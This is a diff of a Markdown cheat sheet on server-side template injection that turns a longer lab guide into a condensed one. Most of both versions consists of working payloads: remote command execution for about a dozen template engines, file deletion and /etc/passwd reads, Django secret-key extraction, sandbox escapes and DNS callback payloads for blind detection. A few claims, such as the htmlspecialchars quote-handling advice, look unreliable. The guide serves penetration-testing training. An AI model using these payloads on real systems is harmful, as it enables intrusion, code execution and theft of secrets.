@@ -1,411 +1,132 @@
-# Server-Side Template Injection (SSTI) - Quick Start Guide
+# SSTI — Quick Start
 
-**Fast-track guide for identifying and exploiting SSTI vulnerabilities**
+## Detection (30 seconds)
 
----
+### Fuzzing payload
 
-## Quick Detection (30 seconds)
+Submit each: `${7*7}` `{{7*7}}` `<%= 7*7 %>` `#{7*7}` `*{7*7}` `@{7*7}` `${{7*7}}`. If response shows `49`, SSTI confirmed.
 
-### Fuzzing Payload
+### Mathematical test
+
 ```
-${{<%[%'"}}%\
-```
-
-**What it does:** Triggers errors revealing template engine
-
-### Mathematical Test
-```
-${7*7}    # Freemarker, Jinja2
-{{7*7}}   # Tornado, Handlebars
-<%= 7*7 %> # ERB
-```
-
-**Expected:** Output shows `49` = vulnerable
-
----
-
-## Template Engine Identification
-
-| Test Payload | Returns 49? | Engine | Language |
-|--------------|-------------|---------|----------|
-| `<%= 7*7 %>` | ✓ | ERB | Ruby |
-| `{{7*7}}` | ✓ | Tornado/Jinja2 | Python |
-| `${7*7}` | ✓ | Freemarker | Java |
-| `{{7*7}}` | ✗ (shows "7*7") | Handlebars | Node.js |
-
-> **Handlebars detection tip:** `{{7*7}}` returns literal "7*7" (not 49). Use `{{this}}` instead — returns `[object Object]` confirming Handlebars.
-| `{{7*7}}` | ✗ (shows "7*7") | Django | Python |
-| `${7*7}` | ✓ | Mako | Python |
-| `#set $x=7*7\n$x` | ✓ (shows 49) | Cheetah | Python (Cobbler et al.) |
-
-**Non-obvious SSTI:** When an app transforms text (font substitution, encoding), test each output column separately — one mapping may pass `${}` through while others convert to safe Unicode.
-
----
-
-## Rapid Exploitation Payloads
-
-### ERB (Ruby) - Lab 1
-**Delete File:**
-```ruby
-<%= system("rm /home/carlos/morale.txt") %>
+{{7*7}}        # Jinja2/Twig: 49
+${7*7}         # Freemarker/Velocity: 49
+<%= 7*7 %>     # ERB: 49
+${{7*7}}       # Spring SpEL
+#{7*7}         # Ruby ERB / Spring
+*{7*7}         # Spring/OGNL
+@{7*7}         # Thymeleaf
+{7*7}          # Mustache (no expressions)
 ```
 
-**Read File:**
-```ruby
-<%= File.read('/etc/passwd') %>
-```
+## Engine identification
 
-### Tornado (Python) - Lab 2
-**Delete File (Breaking Out):**
+| Render of `{{7*7}}` | Engine |
+|---|---|
+| `49` | Jinja2, Twig, Smarty, Liquid |
+| `7*7` (literal) | Mustache, Handlebars |
+| Error mentioning `Twig_Error` | Twig |
+| Error mentioning `jinja2` | Jinja2 |
+| Error mentioning `freemarker` | Freemarker |
+| Error mentioning `velocity` | Velocity |
+
+| Render of `${7*7}` | Engine |
+|---|---|
+| `49` | Freemarker, Velocity, Spring SpEL |
+| `${7*7}` literal | Not Java |
+
+Cross-test with engine-specific syntax to confirm.
+
+## Rapid exploitation by engine
+
+### Jinja2 (Python)
+
 ```python
-user.name}}{%import os%}{{os.system('rm /home/carlos/morale.txt')
+{{ ''.__class__.__mro__[1].__subclasses__() }}                  # enumerate classes
+{{ ''.__class__.__mro__[1].__subclasses__()[N]("id",shell=True,stdout=-1).communicate() }}
+{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
+{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
+{{ get_flashed_messages.__globals__.__builtins__.__import__('os').popen('id').read() }}
+{{ lipsum.__globals__.os.popen('id').read() }}
+{{ namespace.__init__.__globals__.os.popen('id').read() }}
 ```
 
-**Context:** When input is inside `{{user.name}}`
+### Twig (PHP)
 
-### Handlebars (Node.js) - Lab 3
-**RCE via require():**
-```handlebars
-{{#with "s" as |string|}}
-  {{#with "e"}}
-    {{#with split as |conslist|}}
-      {{this.pop}}
-      {{this.push (lookup string.sub "constructor")}}
-      {{this.pop}}
-      {{#with string.split as |codelist|}}
-        {{this.pop}}
-        {{this.push "return require('child_process').exec('rm /home/carlos/morale.txt');"}}
-        {{this.pop}}
-        {{#each conslist}}
-          {{#with (string.sub.apply 0 codelist)}}
-            {{this}}
-          {{/with}}
-        {{/each}}
-      {{/with}}
-    {{/with}}
-  {{/with}}
-{{/with}}
+```php
+{{ _self.env.registerUndefinedFilterCallback("exec") }}{{ _self.env.getFilter("id") }}
+{{ ['id'] | filter('system') }}
+{{ ['cat /flag'] | filter('passthru') }}
 ```
 
-> **If `require` throws ReferenceError** (sandboxed env): replace `require(...)` with `process.mainModule.require(...)` and use `execSync('cmd').toString()` for synchronous output.
+### Twig (HTML-sanitized) / ERB / Tornado / Handlebars / Freemarker / Velocity / SpEL / OGNL / Smarty / Pebble
 
-### Freemarker (Java) - Lab 4
-**RCE via Execute class:**
-```freemarker
-<#assign ex="freemarker.template.utility.Execute"?new()>
-${ex("rm /home/carlos/morale.txt")}
+```
+Twig sanitized:  {{ _self.env.registerUndefinedFilterCallback('exec') }}{{ _self.env.getFilter('id') }}
+ERB:             <%= `id` %>  /  <%= system('id') %>  /  <%= File.read('/etc/passwd') %>
+Tornado:         {% import os %}{{ os.popen('id').read() }}
+Handlebars:      Long lookup chain — see ssti-cheat-sheet.md
+Freemarker:      <#assign x="freemarker.template.utility.Execute"?new()>${x("id")}
+Velocity:        #set($s="")…$s.getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null).exec("id")
+SpEL:            ${T(java.lang.Runtime).getRuntime().exec("id")}
+OGNL:            %{(#cmd='id').(#runtime=@java.lang.Runtime@getRuntime()).(#runtime.exec(#cmd))}
+Smarty 3+:       {system('id')}
+Pebble:          {{ "x"|system("id") }}
 ```
 
-**Documentation path:**
-1. Test `${foobar}` → Error reveals Freemarker
-2. Check FAQ → Find security warnings
-3. Check "new()" built-in → TemplateModel requirement
-4. Check JavaDoc → Find Execute class
+## Common injection points
 
-### Django (Python) - Lab 5
-**Information Disclosure:**
-```django
-{% debug %}
+**GET params:** `?name=<payload>`, `?template=<payload>`, `?id=<payload>`.
+**POST params:** form fields, JSON body fields rendered server-side.
+**Headers:** `User-Agent`, `Referer` (when logged/displayed).
+**File uploads:** SVG / DOCX content fields.
+**Profile/settings:** display name, bio, signature.
+**Email subjects** if templated.
+
+## Context breakouts
+
+```
+Already inside expression: }}{{<payload>}}
+String literal:            "}}{{<payload>}}{{
+Attribute value:           %22%7d%7d{{<payload>}}{{
+Comment block:             {{#comment}}{{/comment}}{{<payload>}}
 ```
 
-**Extract SECRET_KEY:**
-```django
-{{settings.SECRET_KEY}}
-```
+## Burp workflow
 
-### Freemarker Sandboxed - Lab 7
-**Read File via Reflection:**
-```freemarker
-${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(" ")}
-```
+1. Intercept request with potential SSTI input.
+2. Send to Repeater.
+3. Try `{{7*7}}` first — if `49`, identify engine.
+4. Pull engine-specific RCE from above.
+5. Confirm with `id` / `whoami` execution.
 
-**Output:** Decimal ASCII values (e.g., `109 121 112...`)
+## Bypass HTML sanitization
 
-**Convert:** 109=m, 121=y, 112=p → `myp...`
+When `htmlspecialchars()` strips `&`/`"`/`'`, SSTI in attributes:
+- Single quotes (`'`) survive `htmlspecialchars()` default mode.
+- Use single quotes for SSTI strings: `{{ ['id']|filter('system') }}`.
+- Hex entities for special chars: `&#x27;` for `'`, `&#x22;` for `"` — decoded server-side.
 
----
+## Sandbox escapes
 
-## Common Injection Points
-
-### GET Parameters
-```
-/?message=PAYLOAD
-/?template=PAYLOAD
-/?name=PAYLOAD
-```
-
-### POST Parameters
-```
-blog-post-author-display=PAYLOAD
-email_template=PAYLOAD
-user_input=PAYLOAD
-```
-
-### Headers
-```
-User-Agent: PAYLOAD
-X-Forwarded-For: PAYLOAD
-```
-
-### File Uploads
-```
-template.txt containing: PAYLOAD
-```
-
----
-
-## Breaking Out of Contexts
-
-### Already Inside Expression
+**Jinja2 SandboxedEnvironment escape:**
 ```python
-# Template: {{user.name}}
-# Payload: name}}{{7*7}}
-# Result: {{user.name}}{{7*7}}
+{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
 ```
 
-### String Literal
+The `__init__` chain bypasses sandbox restrictions on direct attribute access.
+
+**Twig sandboxed:**
+```php
+{{ _self.env.registerUndefinedFilterCallback("system") }}{{ _self.env.getFilter("id") }}
+```
+
+## File read / Tools / Resources
+
 ```python
-# Template: {{"Hello " + input + "!"}}
-# Payload: " + system("whoami") + "
+{{ get_flashed_messages.__globals__.__builtins__.open('/etc/passwd').read() }}
 ```
 
-### Attribute Value
-```html
-# Template: <div data-value="{{input}}">
-# Payload: "}}<script>alert(1)</script>{{
-```
+Tools: tplmap, SSTImap (https://github.com/vladko312/SSTImap), Burp Repeater, PayloadsAllTheThings/SSTI.
 
----
-
-## Burp Suite Quick Setup
-
-### 1. Intercept Request
-- Turn on Proxy intercept
-- Submit form/request with injectable parameter
-
-### 2. Send to Repeater
-- Right-click → "Send to Repeater"
-
-### 3. Test Payloads
-- Replace parameter with SSTI payloads
-- Click "Send"
-- Check response for "49" or errors
-
-### 4. Automate with Intruder
-- Send to Intruder
-- Mark parameter: `§parameter§`
-- Add payloads: `${7*7}`, `{{7*7}}`, `<%= 7*7 %>`
-- Start attack
-
----
-
-## Blind SSTI Detection
-
-### DNS Callback (Burp Collaborator)
-```ruby
-# ERB
-<%= `nslookup BURP-COLLABORATOR-SUBDOMAIN` %>
-
-# Tornado
-{% import os %}{{os.system('nslookup BURP-COLLABORATOR-SUBDOMAIN')}}
-
-# Freemarker
-<#assign ex="freemarker.template.utility.Execute"?new()>
-${ex("nslookup BURP-COLLABORATOR-SUBDOMAIN")}
-```
-
-### Time-Based Detection
-```ruby
-# ERB
-<%= sleep(10) %>
-
-# Python
-{% import time %}{{time.sleep(10)}}
-```
-
----
-
-## URL Encoding Quick Reference
-
-| Character | URL Encoded |
-|-----------|-------------|
-| `<` | `%3C` |
-| `>` | `%3E` |
-| `%` | `%25` |
-| `{` | `%7B` |
-| `}` | `%7D` |
-| `"` | `%22` |
-| Space | `+` or `%20` |
-
----
-
-## Template Syntax Cheat Sheet
-
-### ERB (Ruby)
-```erb
-<%= code %>     # Execute and output
-<% code %>      # Execute without output
-<%# comment %>  # Comment
-```
-
-### Tornado/Jinja2 (Python)
-```python
-{{ expression }}     # Output
-{% code %}          # Execute
-{# comment #}       # Comment
-```
-
-### Freemarker (Java)
-```freemarker
-${expression}           # Output
-<#assign var=value>    # Variable
-<#if test>...</#if>    # Conditional
-```
-
-### Handlebars (JavaScript)
-```handlebars
-{{ expression }}              # Output
-{{#helper}}...{{/helper}}    # Block helper
-{{! comment }}               # Comment
-```
-
-### Django (Python)
-```django
-{{ variable }}        # Output
-{% tag %}            # Execute tag
-{{ var|filter }}     # Apply filter
-```
-
----
-
-## Common Mistakes
-
-### 1. Forgetting URL Encoding
-```
-❌ /?message=<%= 7*7 %>
-✓ /?message=%3C%25%3D+7*7+%25%3E
-```
-
-### 2. Not Breaking Out of Context
-```
-❌ {{system("whoami")}}
-✓ name}}{{system("whoami")}}
-```
-
-### 3. Wrong Template Syntax
-```
-❌ Django: {{7*7}} expecting 49
-✓ Django: Use {% debug %} or {{settings}}
-```
-
-### 4. Missing Method Parameters
-```
-❌ user.setAvatar('/etc/passwd')
-✓ user.setAvatar('/etc/passwd','image/jpg')
-```
-
----
-
-## Cheat Sheet: One-Liner Exploits
-
-```bash
-# ERB - File read
-<%= File.read('/etc/passwd') %>
-
-# ERB - RCE
-<%= system("whoami") %>
-
-# Tornado - RCE
-{% import os %}{{os.system('whoami')}}
-
-# Jinja2 - RCE
-{{ config.__class__.__init__.__globals__['os'].popen('whoami').read() }}
-
-# Freemarker - RCE
-<#assign ex="freemarker.template.utility.Execute"?new()>${ex("whoami")}
-
-# Django - Secret extraction
-{{settings.SECRET_KEY}}
-
-# Handlebars - RCE (short form, see full payload above)
-{{#with "s" as |string|}}...require('child_process').exec('cmd')...{{/with}}
-```
-
----
-
-## Red Flags in Applications
-
-**High-Risk Features:**
-- Custom email templates
-- Report generators
-- User-customizable views
-- Content management systems
-- Template editors
-- Preview functions
-- PDF generators / certificate generators
-- Invoice / receipt renderers
-
-**Parameters to Test:**
-- `template=`
-- `view=`
-- `page=`
-- `format=`
-- `message=`
-- Any user-controlled text rendered server-side
-
-**Stored / Second-Order SSTI:**
-- Payload injected in one endpoint (e.g., profile update, form field), triggered in another (e.g., PDF export, certificate generation, email send)
-- Test flow: save `{{7*7}}` in a profile/name field, then trigger any render action (download certificate, generate report, preview) and check output for `49`
-- Common pattern: user-editable fields (name, address, notes) rendered unsafely into PDF/HTML via wkhtmltopdf, WeasyPrint, or similar
-
----
-
-## Methodology Summary
-
-```
-1. DETECT
-   └─ Fuzz: ${{<%[%'"}}%\
-   └─ Test: ${7*7}, {{7*7}}, <%= 7*7 %>
-
-2. IDENTIFY
-   └─ Analyze errors
-   └─ Test engine-specific syntax
-   └─ Check documentation
-
-3. EXPLOIT
-   └─ Research engine capabilities
-   └─ Find dangerous functions
-   └─ Construct payload
-   └─ Break out of context if needed
-
-4. VERIFY
-   └─ Check objective achieved
-   └─ Use Burp Collaborator for blind
-   └─ Decode output if needed
-```
-
----
-
-## Prevention Tips
-
-**For Developers:**
-1. Never concatenate user input into templates
-2. Pass user data as parameters only
-3. Use logic-less template engines (Mustache) where possible
-4. Enable sandboxing if user templates are required
-5. Disable dangerous built-ins (`new()`, `exec()`, etc.)
-
-**For Pentesters:**
-1. Always test for SSTI in template-like features
-2. Don't rely on a single payload — test multiple engines
-3. Read documentation for obscure template engines
-4. Check for blind SSTI with DNS/HTTP callbacks
-5. Test both direct output and code contexts
-
-## Resources
-
-- PayloadsAllTheThings SSTI: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
-- HackTricks SSTI: https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
-- tplmap (automated detection): https://github.com/epinna/tplmap
-- James Kettle research: "Server-Side Template Injection: RCE for the modern webapp"
-
+Resources: `ssti-cheat-sheet.md`, `ssti-resources.md`, PortSwigger SSTI labs.
